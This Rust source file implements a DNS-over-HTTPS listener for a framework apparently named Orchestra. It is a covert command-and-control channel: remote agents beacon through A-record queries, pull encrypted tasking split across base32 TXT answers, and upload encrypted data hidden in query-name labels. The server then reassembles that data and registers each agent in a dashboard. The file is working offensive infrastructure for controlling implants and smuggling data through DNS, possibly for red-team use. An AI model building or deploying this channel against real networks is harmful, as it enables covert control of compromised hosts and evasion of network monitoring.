//! DNS-over-HTTPS listener bridging DoH queries to Orchestra agent sessions.

use crate::state::{now_secs, AgentEntry, AppState};
use anyhow::{anyhow, Result};
use axum::{
    body::Bytes,
    extract::{ConnectInfo, Query, State},
    http::{header, HeaderValue, StatusCode},
    response::IntoResponse,
    routing::get,
    Json, Router,
};
use axum_server::accept::Accept;
use common::{CryptoSession, Message, PROTOCOL_VERSION};
use dashmap::{
    mapref::entry::Entry,
    DashMap,
};
use serde::{Deserialize, Serialize};
use std::{
    collections::{BTreeMap, VecDeque},
    future::Future,
    io,
    net::{IpAddr, Ipv4Addr, SocketAddr},
    pin::Pin,
    sync::{Arc, Mutex},
    time::{Duration, Instant},
};
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio_rustls::{server::TlsStream, TlsAcceptor};

const TYPE_A: u16 = 1;
const TYPE_TXT: u16 = 16;
const DOH_SESSION_SWEEP_INTERVAL_SECS: u64 = 60;
const DOH_SESSION_TIMEOUT_DEFAULT_SECS: u64 = 300;
const DOH_RATE_LIMIT_DEFAULT_QPS: u32 = 10;

#[derive(Clone)]
struct DohRuntime {
    app: Arc<AppState>,
    domain: String,
    domain_labels: Vec<String>,
    beacon_sentinel: Ipv4Addr,
    idle_ip: Ipv4Addr,
    crypto: Arc<CryptoSession>,
    /// Fully-authenticated sessions visible on the dashboard.
    sessions: Arc<DashMap<String, Arc<Mutex<DohSession>>>>,
    /// Unauthenticated staging area. Sessions live here until the sender
    /// proves they hold the shared secret by producing a valid ciphertext
    /// that decrypts + deserializes. Only then are they promoted to
    /// `sessions` and appear in the agent dashboard.
    staging: Arc<DashMap<String, Arc<Mutex<DohSession>>>>,
    rate_limit_qps: u32,
    rate_buckets: Arc<DashMap<IpAddr, IpRateBucket>>,
}

struct IpRateBucket {
    window_start: Instant,
    count: u32,
}

struct DohSession {
    connection_id: String,
    fragments: BTreeMap<u32, String>,
    next_seq: Option<u32>,
    outbound_rx: mpsc::Receiver<Message>,
    outbound_queue: VecDeque<Message>,
    last_activity: Instant,
    authenticated: bool,
}

impl DohRuntime {
    fn new(
        app: Arc<AppState>,
        agent_secret: String,
        domain: String,
        beacon_sentinel: String,
        idle_ip: String,
    ) -> Result<Self> {
        let domain = normalize_name(&domain);
        if domain.is_empty() {
            return Err(anyhow!("doh_domain cannot be empty"));
        }

        let beacon_sentinel = beacon_sentinel
            .parse::<Ipv4Addr>()
            .map_err(|e| anyhow!("invalid doh_beacon_sentinel: {e}"))?;
        let idle_ip = idle_ip
            .parse::<Ipv4Addr>()
            .map_err(|e| anyhow!("invalid doh_idle_ip: {e}"))?;
        let rate_limit_qps = doh_rate_limit_qps();

        Ok(Self {
            app,
            domain_labels: split_labels(&domain),
            domain,
            beacon_sentinel,
            idle_ip,
            crypto: Arc::new(CryptoSession::from_shared_secret(agent_secret.as_bytes())),
            sessions: Arc::new(DashMap::new()),
            staging: Arc::new(DashMap::new()),
            rate_limit_qps,
            rate_buckets: Arc::new(DashMap::new()),
        })
    }

    /// Return the authenticated session for `session_id`, if it exists.
    /// Returns `None` if the session has not yet been authenticated.
    fn get_authenticated_session(&self, session_id: &str) -> Option<Arc<Mutex<DohSession>>> {
        self.sessions.get(session_id).map(|r| r.value().clone())
    }

    /// Return the staging session for `session_id`, creating a new
    /// unauthenticated one if needed.  Staging sessions do **not** appear in
    /// the agent dashboard; they merely buffer encrypted fragments until the
    /// sender proves possession of the shared secret.
    fn get_or_create_staging_session(&self, session_id: &str) -> Arc<Mutex<DohSession>> {
        match self.staging.entry(session_id.to_string()) {
            Entry::Occupied(o) => o.get().clone(),
            Entry::Vacant(v) => {
                let session = Arc::new(Mutex::new(DohSession {
                    connection_id: format!("doh-{session_id}"),
                    fragments: BTreeMap::new(),
                    next_seq: None,
                    outbound_rx: {
                        // Create a dummy channel — it will be replaced on
                        // promotion.  The sender is dropped immediately so no
                        // messages can queue.
                        let (tx, rx) = mpsc::channel::<Message>(64);
                        drop(tx);
                        rx
                    },
                    outbound_queue: VecDeque::new(),
                    last_activity: Instant::now(),
                    authenticated: false,
                }));
                v.insert(session.clone());
                session
            }
        }
    }

    /// Promote a staging session to a fully-authenticated session.
    /// Creates the `AgentEntry` in the registry, registers in the
    /// `sessions` map, and removes from staging.  Returns the promoted
    /// session handle.
    fn promote_session(&self, session_id: &str, staging_sess: Arc<Mutex<DohSession>>) {
        let connection_id = format!("doh-{session_id}");
        let (tx, rx) = mpsc::channel::<Message>(64);

        // Register in the agent dashboard.
        let morph_seed = self.app.generate_unique_seed();
        self.app.assigned_seeds.insert(morph_seed);
        self.app.registry.insert(
            connection_id.clone(),
            AgentEntry {
                connection_id: connection_id.clone(),
                agent_id: format!("doh-{session_id}"),
                hostname: "doh".to_string(),
                last_seen: now_secs(),
                tx,
                peer: format!("doh/{session_id}"),
                morph_seed,
                text_hash: None,
            },
        );

        // Replace the dummy outbound_rx with the real channel.
        {
            let mut guard = match staging_sess.lock() {
                Ok(g) => g,
                Err(poisoned) => poisoned.into_inner(),
            };
            guard.outbound_rx = rx;
            guard.authenticated = true;
        }

        // Move from staging to authenticated sessions.
        self.staging.remove(session_id);
        self.sessions.insert(session_id.to_string(), staging_sess);
    }

    fn allow_query_from_ip(&self, ip: IpAddr) -> bool {
        let now = Instant::now();
        let window = Duration::from_secs(1);

        match self.rate_buckets.entry(ip) {
            Entry::Occupied(mut occupied) => {
                let bucket = occupied.get_mut();
                if now.saturating_duration_since(bucket.window_start) >= window {
                    bucket.window_start = now;
                    bucket.count = 1;
                    true
                } else if bucket.count < self.rate_limit_qps {
                    bucket.count += 1;
                    true
                } else {
                    false
                }
            }
            Entry::Vacant(vacant) => {
                vacant.insert(IpRateBucket {
                    window_start: now,
                    count: 1,
                });
                true
            }
        }
    }

    fn drain_outbound_queue(sess: &mut DohSession) {
        while let Ok(msg) = sess.outbound_rx.try_recv() {
            sess.outbound_queue.push_back(msg);
        }
    }

    fn parse_name(&self, name: &str) -> Option<ParsedName> {
        let normalized = normalize_name(name);
        let labels = split_labels(&normalized);
        if labels.len() <= self.domain_labels.len() {
            return None;
        }
        if !has_suffix(&labels, &self.domain_labels) {
            return None;
        }

        let prefix = &labels[..labels.len() - self.domain_labels.len()];
        match prefix {
            [kind, session_id] if kind == common::ioc::IOC_DNS_BEACON && is_hex(session_id) => {
                Some(ParsedName::Beacon {
                    session_id: session_id.clone(),
                })
            }
            [kind, session_id] if kind == common::ioc::IOC_DNS_TASK && is_hex(session_id) => {
                Some(ParsedName::Task {
                    session_id: session_id.clone(),
                })
            }
            [seq_s, chunk, session_id] if is_hex(session_id) => {
                let seq = seq_s.parse::<u32>().ok()?;
                Some(ParsedName::Fragment {
                    session_id: session_id.clone(),
                    seq,
                    chunk: chunk.clone(),
                })
            }
            _ => None,
        }
    }

    fn resolve_query(&self, name: &str, qtype: u16) -> ResolveResult {
        let parsed = match self.parse_name(name) {
            Some(p) => p,
            None => {
                return ResolveResult {
                    rcode: 3,
                    answers: Vec::new(),
                };
            }
        };

        match parsed {
            ParsedName::Fragment {
                session_id,
                seq,
                chunk,
            } => {
                if qtype == TYPE_TXT {
                    self.handle_fragment(&session_id, seq, &chunk);
                }
                ResolveResult {
                    rcode: 0,
                    answers: Vec::new(),
                }
            }
            ParsedName::Beacon { session_id } => {
                if qtype != TYPE_A {
                    return ResolveResult {
                        rcode: 0,
                        answers: Vec::new(),
                    };
                }
                let has_pending = self.session_has_pending_tasking(&session_id);
                let ip = if has_pending {
                    self.beacon_sentinel
                } else {
                    self.idle_ip
                };
                ResolveResult {
                    rcode: 0,
                    answers: vec![Answer::A(ip)],
                }
            }
            ParsedName::Task { session_id } => {
                if qtype != TYPE_TXT {
                    return ResolveResult {
                        rcode: 0,
                        answers: Vec::new(),
                    };
                }
                ResolveResult {
                    rcode: 0,
                    answers: self.pop_tasking_answers(&session_id),
                }
            }
        }
    }

    fn session_has_pending_tasking(&self, session_id: &str) -> bool {
        let Some(session) = self.get_authenticated_session(session_id) else {
            return false;
        };
        let mut guard = match session.lock() {
            Ok(g) => g,
            Err(poisoned) => poisoned.into_inner(),
        };
        Self::drain_outbound_queue(&mut guard);
        !guard.outbound_queue.is_empty()
    }

    fn pop_tasking_answers(&self, session_id: &str) -> Vec<Answer> {
        let Some(session) = self.get_authenticated_session(session_id) else {
            return Vec::new();
        };
        let maybe_msg = {
            let mut guard = match session.lock() {
                Ok(g) => g,
                Err(poisoned) => poisoned.into_inner(),
            };
            Self::drain_outbound_queue(&mut guard);
            guard.outbound_queue.pop_front()
        };

        let Some(msg) = maybe_msg else {
            return Vec::new();
        };

        let plain = match bincode::serialize(&msg) {
            Ok(v) => v,
            Err(e) => {
                tracing::warn!("failed to serialize pending DoH task: {e}");
                return Vec::new();
            }
        };

        let ciphertext = self.crypto.encrypt(&plain);
        let b32 = b32_encode(&ciphertext).to_ascii_lowercase();
        if b32.is_empty() {
            return Vec::new();
        }

        b32.as_bytes()
            .chunks(255)
            .map(|c| Answer::Txt(String::from_utf8_lossy(c).to_string()))
            .collect()
    }

    fn handle_fragment(&self, session_id: &str, seq: u32, chunk: &str) {
        if !is_base32_fragment(chunk) {
            return;
        }

        // Check if already authenticated — if so, use the authenticated session.
        // Otherwise, use the staging area.
        let session = self
            .get_authenticated_session(session_id)
            .unwrap_or_else(|| self.get_or_create_staging_session(session_id));

        let msgs = {
            let mut guard = match session.lock() {
                Ok(g) => g,
                Err(poisoned) => poisoned.into_inner(),
            };
            guard.fragments.insert(seq, chunk.to_string());
            guard.last_activity = Instant::now();
            if guard.next_seq.is_none() {
                guard.next_seq = Some(seq);
            }
            try_reassemble_messages(&mut guard, &self.crypto)
        };

        if msgs.is_empty() {
            return;
        }

        // A successfully decrypted + deserialized message proves the sender
        // holds the shared DoH secret.  Promote from staging if needed.
        let is_newly_authenticated = !self.sessions.contains_key(session_id);
        if is_newly_authenticated {
            // Mark as authenticated inside the session.
            {
                let mut guard = match session.lock() {
                    Ok(g) => g,
                    Err(poisoned) => poisoned.into_inner(),
                };
                guard.authenticated = true;
            }
            self.promote_session(session_id, session.clone());
        }

        for msg in msgs {
            self.handle_agent_message(session_id, msg);
        }
    }

    fn handle_agent_message(&self, session_id: &str, msg: Message) {
        let connection_id = format!("doh-{session_id}");

        match msg {
            Message::VersionHandshake { version } => {
                if version != PROTOCOL_VERSION {
                    tracing::warn!(
                        session_id = %session_id,
                        agent_version = version,
                        server_version = PROTOCOL_VERSION,
                        "DoH agent/server protocol version mismatch"
                    );
                }
                self.enqueue_outbound(
                    session_id,
                    Message::VersionHandshake {
                        version: PROTOCOL_VERSION,
                    },
                );
            }
            Message::Heartbeat {
                agent_id,
                status,
                timestamp: _,
            } => {
                if self
                    .app
                    .registry
                    .iter()
                    .any(|e| e.value().agent_id == agent_id && e.key() != &connection_id)
                {
                    tracing::warn!(
                        agent_id = %agent_id,
                        connection_id = %connection_id,
                        "duplicate agent_id reported on DoH session"
                    );
                }

                if let Some(mut entry) = self.app.registry.get_mut(&connection_id) {
                    entry.agent_id = agent_id;
                    entry.hostname = status;
                    entry.last_seen = now_secs();
                }
            }
            Message::TaskResponse { task_id, result, .. } => {
                if let Some((_, sender)) = self.app.pending.remove(&task_id) {
                    let _ = sender.send(result);
                }
            }
            Message::AuditLog(ev) => {
                self.app.audit.record(ev);
            }
            _ => {
                tracing::debug!(
                    session_id = %session_id,
                    "ignoring DoH agent->server message variant"
                );
            }
        }
    }

    fn enqueue_outbound(&self, session_id: &str, msg: Message) {
        let Some(session) = self.get_authenticated_session(session_id) else {
            return;
        };
        let mut guard = match session.lock() {
            Ok(g) => g,
            Err(poisoned) => poisoned.into_inner(),
        };
        guard.outbound_queue.push_back(msg);
        if let Some(mut entry) = self.app.registry.get_mut(&guard.connection_id) {
            entry.last_seen = now_secs();
        }
    }

    fn cleanup_stale_sessions(&self, stale_after: Duration) -> usize {
        let now = Instant::now();
        let stale = self
            .sessions
            .iter()
            .filter_map(|entry| {
                let session_id = entry.key().clone();
                let session = entry.value().clone();
                let guard = match session.lock() {
                    Ok(g) => g,
                    Err(poisoned) => poisoned.into_inner(),
                };

                if now.saturating_duration_since(guard.last_activity) > stale_after {
                    Some((session_id, guard.connection_id.clone()))
                } else {
                    None
                }
            })
            .collect::<Vec<_>>();

        for (session_id, connection_id) in &stale {
            self.sessions.remove(session_id);
            self.app.registry.remove(connection_id);
        }

        // Also sweep stale unauthenticated staging sessions.
        let staging_stale: Vec<String> = self
            .staging
            .iter()
            .filter_map(|entry| {
                let session_id = entry.key().clone();
                let session = entry.value().clone();
                let guard = match session.lock() {
                    Ok(g) => g,
                    Err(poisoned) => poisoned.into_inner(),
                };
                if now.saturating_duration_since(guard.last_activity) > stale_after {
                    Some(session_id)
                } else {
                    None
                }
            })
            .collect();

        let staging_count = staging_stale.len();
        for session_id in &staging_stale {
            self.staging.remove(session_id);
        }

        stale.len() + staging_count
    }
}

#[derive(Clone)]
struct DohTlsAcceptor {
    inner: TlsAcceptor,
}

type DohTlsAcceptFuture<S> = Pin<Box<dyn Future<Output = io::Result<(TlsStream<TcpStream>, S)>> + Send>>;

impl<S> Accept<TcpStream, S> for DohTlsAcceptor
where
    S: Send + 'static,
{
    type Stream = TlsStream<TcpStream>;
    type Service = S;
    type Future = DohTlsAcceptFuture<S>;

    fn accept(&self, stream: TcpStream, service: S) -> Self::Future {
        let acceptor = self.inner.clone();
        Box::pin(async move {
            let tls = acceptor.accept(stream).await.map_err(|e| {
                io::Error::new(
                    io::ErrorKind::Other,
                    format!("DoH TLS handshake failed: {e}"),
                )
            })?;
            Ok((tls, service))
        })
    }
}

fn parse_bool_env(name: &str) -> Option<bool> {
    let raw = std::env::var(name).ok()?;
    let lowered = raw.trim().to_ascii_lowercase();
    match lowered.as_str() {
        "1" | "true" | "yes" | "on" => Some(true),
        "0" | "false" | "no" | "off" => Some(false),
        _ => {
            tracing::warn!(env = %name, value = %raw, "invalid boolean environment override; ignoring");
            None
        }
    }
}

fn doh_use_tls_enabled(state: &AppState) -> bool {
    // Matches requested default behavior: enable DoH TLS when a TLS cert path
    // is configured, unless explicitly overridden.
    let default_enabled = state.config.tls_cert_path.is_some();
    parse_bool_env("ORCHESTRA_DOH_USE_TLS").unwrap_or(default_enabled)
}

fn doh_session_timeout() -> Duration {
    let raw = std::env::var("ORCHESTRA_DOH_SESSION_TIMEOUT_SECS").ok();
    match raw.and_then(|s| s.parse::<u64>().ok()) {
        Some(0) | None => Duration::from_secs(DOH_SESSION_TIMEOUT_DEFAULT_SECS),
        Some(secs) => Duration::from_secs(secs),
    }
}

fn doh_rate_limit_qps() -> u32 {
    let raw = std::env::var("ORCHESTRA_DOH_RATE_LIMIT_QPS").ok();
    match raw.and_then(|s| s.parse::<u32>().ok()) {
        Some(0) | None => DOH_RATE_LIMIT_DEFAULT_QPS,
        Some(qps) => qps,
    }
}

fn try_reassemble_messages(sess: &mut DohSession, crypto: &CryptoSession) -> Vec<Message> {
    let mut out = Vec::new();

    loop {
        let start = match sess.next_seq {
            Some(v) => v,
            None => match sess.fragments.keys().next().copied() {
                Some(v) => {
                    sess.next_seq = Some(v);
                    v
                }
                None => break,
            },
        };

        if !sess.fragments.contains_key(&start) {
            break;
        }

        let mut assembled = String::new();
        let mut seq = start;
        let mut resolved: Option<(u32, Message)> = None;

        loop {
            let chunk = match sess.fragments.get(&seq) {
                Some(c) => c.clone(),
                None => break,
            };
            assembled.push_str(&chunk);

            if let Some(ciphertext) = b32_decode(&assembled) {
                if let Ok(plain) = crypto.decrypt(&ciphertext) {
                    if let Ok(msg) = bincode::deserialize::<Message>(&plain) {
                        resolved = Some((seq, msg));
                        break;
                    }
                }
            }

            let next = seq.wrapping_add(1);
            if next == start {
                break;
            }
            seq = next;
        }

        let Some((end_seq, msg)) = resolved else {
            break;
        };

        let mut cur = start;
        loop {
            sess.fragments.remove(&cur);
            if cur == end_seq {
                break;
            }
            cur = cur.wrapping_add(1);
        }
        sess.next_seq = Some(end_seq.wrapping_add(1));
        out.push(msg);
    }

    out
}

#[derive(Debug, Clone)]
enum ParsedName {
    Fragment {
        session_id: String,
        seq: u32,
        chunk: String,
    },
    Beacon {
        session_id: String,
    },
    Task {
        session_id: String,
    },
}

#[derive(Debug, Clone)]
enum Answer {
    A(Ipv4Addr),
    Txt(String),
}

struct ResolveResult {
    rcode: u8,
    answers: Vec<Answer>,
}

#[derive(Deserialize)]
struct DnsGetQuery {
    name: String,
    #[serde(rename = "type")]
    qtype: String,
}

#[derive(Serialize)]
struct DnsJsonQuestion {
    name: String,
    #[serde(rename = "type")]
    qtype: u16,
}

#[derive(Serialize)]
struct DnsJsonAnswer {
    name: String,
    #[serde(rename = "type")]
    qtype: u16,
    #[serde(rename = "TTL")]
    ttl: u32,
    data: String,
}

#[derive(Serialize)]
struct DnsJsonResponse {
    #[serde(rename = "Status")]
    status: u8,
    #[serde(rename = "TC")]
    tc: bool,
    #[serde(rename = "RD")]
    rd: bool,
    #[serde(rename = "RA")]
    ra: bool,
    #[serde(rename = "AD")]
    ad: bool,
    #[serde(rename = "CD")]
    cd: bool,
    #[serde(rename = "Question")]
    question: Vec<DnsJsonQuestion>,
    #[serde(rename = "Answer")]
    answer: Vec<DnsJsonAnswer>,
}

fn router(state: Arc<DohRuntime>) -> Router {
    Router::new()
        .route("/dns-query", get(handle_get).post(handle_post))
        .with_state(state)
}

pub async fn run(
    app: Arc<AppState>,
    listen_addr: SocketAddr,
    agent_secret: String,
    doh_domain: String,
    doh_beacon_sentinel: String,
    doh_idle_ip: String,
) -> Result<()> {
    let state = Arc::new(DohRuntime::new(
        app,
        agent_secret,
        doh_domain,
        doh_beacon_sentinel,
        doh_idle_ip,
    )?);

    let use_tls = doh_use_tls_enabled(&state.app);
    let stale_after = doh_session_timeout();
    let sweep_state = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(DOH_SESSION_SWEEP_INTERVAL_SECS));
        loop {
            interval.tick().await;
            let removed = sweep_state.cleanup_stale_sessions(stale_after);
            tracing::debug!("DoH: cleaned up {} stale sessions", removed);
        }
    });

    tracing::info!(
        addr = %listen_addr,
        domain = %state.domain,
        tls = use_tls,
        session_timeout_secs = stale_after.as_secs(),
        rate_limit_qps = state.rate_limit_qps,
        "DoH listener bound"
    );

    if use_tls {
        let tls_cfg = crate::tls::build(
            state.app.config.tls_cert_path.as_deref(),
            state.app.config.tls_key_path.as_deref(),
        )
        .await?
        .get_inner();

        let acceptor = DohTlsAcceptor {
            inner: TlsAcceptor::from(tls_cfg),
        };

        axum_server::bind(listen_addr)
            .acceptor(acceptor)
            .serve(router(state).into_make_service_with_connect_info::<SocketAddr>())
            .await?;
    } else {
        let listener = tokio::net::TcpListener::bind(listen_addr).await?;
        axum::serve(
            listener,
            router(state).into_make_service_with_connect_info::<SocketAddr>(),
        )
        .await?;
    }
    Ok(())
}

async fn handle_get(
    State(state): State<Arc<DohRuntime>>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    Query(query): Query<DnsGetQuery>,
) -> impl IntoResponse {
    let qtype = match parse_qtype(&query.qtype) {
        Some(t) => t,
        None => return (StatusCode::BAD_REQUEST, "unsupported query type").into_response(),
    };

    if !state.allow_query_from_ip(peer.ip()) {
        let payload = DnsJsonResponse {
            status: 0,
            tc: false,
            rd: true,
            ra: true,
            ad: false,
            cd: false,
            question: vec![DnsJsonQuestion {
                name: query.name,
                qtype,
            }],
            answer: Vec::new(),
        };

        return (
            [(
                header::CONTENT_TYPE,
                HeaderValue::from_static("application/dns-json"),
            )],
            Json(payload),
        )
            .into_response();
    }

    let resolved = state.resolve_query(&query.name, qtype);
    let answer = resolved
        .answers
        .iter()
        .map(|a| match a {
            Answer::A(ip) => DnsJsonAnswer {
                name: query.name.clone(),
                qtype: TYPE_A,
                ttl: 30,
                data: ip.to_string(),
            },
            Answer::Txt(txt) => DnsJsonAnswer {
                name: query.name.clone(),
                qtype: TYPE_TXT,
                ttl: 1,
                data: format!("\"{}\"", txt),
            },
        })
        .collect::<Vec<_>>();

    let payload = DnsJsonResponse {
        status: resolved.rcode,
        tc: false,
        rd: true,
        ra: true,
        ad: false,
        cd: false,
        question: vec![DnsJsonQuestion {
            name: query.name,
            qtype,
        }],
        answer,
    };

    (
        [(
            header::CONTENT_TYPE,
            HeaderValue::from_static("application/dns-json"),
        )],
        Json(payload),
    )
        .into_response()
}

async fn handle_post(
    State(state): State<Arc<DohRuntime>>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    body: Bytes,
) -> impl IntoResponse {
    let query = match parse_dns_wire_query(&body) {
        Ok(q) => q,
        Err(e) => {
            tracing::debug!("invalid DoH dns-message query: {e}");
            return (StatusCode::BAD_REQUEST, "invalid dns-message payload").into_response();
        }
    };

    if !state.allow_query_from_ip(peer.ip()) {
        let packet = build_dns_wire_response(
            &query,
            &ResolveResult {
                rcode: 0,
                answers: Vec::new(),
            },
        );

        return (
            [(
                header::CONTENT_TYPE,
                HeaderValue::from_static("application/dns-message"),
            )],
            packet,
        )
            .into_response();
    }

    let resolved = state.resolve_query(&query.qname, query.qtype);
    let packet = build_dns_wire_response(&query, &resolved);

    (
        [(
            header::CONTENT_TYPE,
            HeaderValue::from_static("application/dns-message"),
        )],
        packet,
    )
        .into_response()
}

struct WireQuestion {
    id: u16,
    qname: String,
    qtype: u16,
    qclass: u16,
    raw_question: Vec<u8>,
}

fn parse_dns_wire_query(packet: &[u8]) -> Result<WireQuestion> {
    if packet.len() < 12 {
        return Err(anyhow!("dns packet too short"));
    }

    let id = u16::from_be_bytes([packet[0], packet[1]]);
    let qdcount = u16::from_be_bytes([packet[4], packet[5]]);
    if qdcount == 0 {
        return Err(anyhow!("dns query contains no questions"));
    }

    let mut idx = 12usize;
    let qstart = idx;
    let mut labels = Vec::new();

    loop {
        if idx >= packet.len() {
            return Err(anyhow!("truncated qname"));
        }
        let len = packet[idx] as usize;
        idx += 1;
        if len == 0 {
            break;
        }
        if (len & 0xC0) != 0 {
            return Err(anyhow!("compressed qname pointers are not supported"));
        }
        if idx + len > packet.len() {
            return Err(anyhow!("truncated qname label"));
        }
        let label = std::str::from_utf8(&packet[idx..idx + len])?
            .to_ascii_lowercase();
        labels.push(label);
        idx += len;
    }

    if idx + 4 > packet.len() {
        return Err(anyhow!("truncated dns question"));
    }

    let qtype = u16::from_be_bytes([packet[idx], packet[idx + 1]]);
    let qclass = u16::from_be_bytes([packet[idx + 2], packet[idx + 3]]);
    idx += 4;

    Ok(WireQuestion {
        id,
        qname: labels.join("."),
        qtype,
        qclass,
        raw_question: packet[qstart..idx].to_vec(),
    })
}

fn build_dns_wire_response(query: &WireQuestion, resolved: &ResolveResult) -> Vec<u8> {
    let mut out = Vec::with_capacity(512);

    let flags = 0x8180u16 | (resolved.rcode as u16);
    out.extend_from_slice(&query.id.to_be_bytes());
    out.extend_from_slice(&flags.to_be_bytes());
    out.extend_from_slice(&(1u16).to_be_bytes());
    out.extend_from_slice(&(resolved.answers.len() as u16).to_be_bytes());
    out.extend_from_slice(&0u16.to_be_bytes());
    out.extend_from_slice(&0u16.to_be_bytes());

    out.extend_from_slice(&query.raw_question);

    for answer in &resolved.answers {
        // Name compression pointer to offset 12 (start of first qname).
        out.extend_from_slice(&[0xC0, 0x0C]);

        match answer {
            Answer::A(ip) => {
                out.extend_from_slice(&TYPE_A.to_be_bytes());
                out.extend_from_slice(&query.qclass.to_be_bytes());
                out.extend_from_slice(&30u32.to_be_bytes());
                out.extend_from_slice(&4u16.to_be_bytes());
                out.extend_from_slice(&ip.octets());
            }
            Answer::Txt(txt) => {
                let bytes = txt.as_bytes();
                let txt_len = bytes.len().min(255) as u8;
                out.extend_from_slice(&TYPE_TXT.to_be_bytes());
                out.extend_from_slice(&query.qclass.to_be_bytes());
                out.extend_from_slice(&1u32.to_be_bytes());
                out.extend_from_slice(&(u16::from(txt_len) + 1).to_be_bytes());
                out.push(txt_len);
                out.extend_from_slice(&bytes[..txt_len as usize]);
            }
        }
    }

    out
}

fn parse_qtype(s: &str) -> Option<u16> {
    let s = s.trim();
    if s.eq_ignore_ascii_case("a") {
        Some(TYPE_A)
    } else if s.eq_ignore_ascii_case("txt") {
        Some(TYPE_TXT)
    } else {
        s.parse::<u16>().ok()
    }
}

fn normalize_name(name: &str) -> String {
    name.trim().trim_end_matches('.').to_ascii_lowercase()
}

fn split_labels(name: &str) -> Vec<String> {
    name.split('.')
        .filter(|p| !p.is_empty())
        .map(|p| p.to_ascii_lowercase())
        .collect()
}

fn has_suffix(labels: &[String], suffix: &[String]) -> bool {
    if labels.len() < suffix.len() {
        return false;
    }
    let start = labels.len() - suffix.len();
    labels[start..]
        .iter()
        .zip(suffix.iter())
        .all(|(a, b)| a == b)
}

fn is_hex(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_hexdigit())
}

fn is_base32_fragment(s: &str) -> bool {
    !s.is_empty()
        && s
            .bytes()
            .all(|b| matches!(b, b'A'..=b'Z' | b'a'..=b'z' | b'2'..=b'7'))
}

const B32_ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

fn b32_encode(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }

    let mut out = String::new();
    let mut buffer: u32 = 0;
    let mut bits = 0u8;

    for &b in data {
        buffer = (buffer << 8) | (b as u32);
        bits += 8;
        while bits >= 5 {
            let shift = bits - 5;
            let idx = ((buffer >> shift) & 0x1f) as usize;
            out.push(B32_ALPHABET[idx] as char);
            bits -= 5;
            if bits > 0 {
                buffer &= (1u32 << bits) - 1;
            } else {
                buffer = 0;
            }
        }
    }

    if bits > 0 {
        let idx = ((buffer << (5 - bits)) & 0x1f) as usize;
        out.push(B32_ALPHABET[idx] as char);
    }

    out
}

fn b32_decode(input: &str) -> Option<Vec<u8>> {
    if input.is_empty() {
        return Some(Vec::new());
    }

    let mut out = Vec::new();
    let mut buffer: u32 = 0;
    let mut bits: u8 = 0;

    for &b in input.as_bytes() {
        if b == b'=' {
            continue;
        }
        let v = match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a',
            b'2'..=b'7' => b - b'2' + 26,
            _ => return None,
        } as u32;

        buffer = (buffer << 5) | v;
        bits += 5;

        while bits >= 8 {
            let shift = bits - 8;
            out.push(((buffer >> shift) & 0xff) as u8);
            bits -= 8;
            if bits > 0 {
                buffer &= (1u32 << bits) - 1;
            } else {
                buffer = 0;
            }
        }
    }

    Some(out)
}
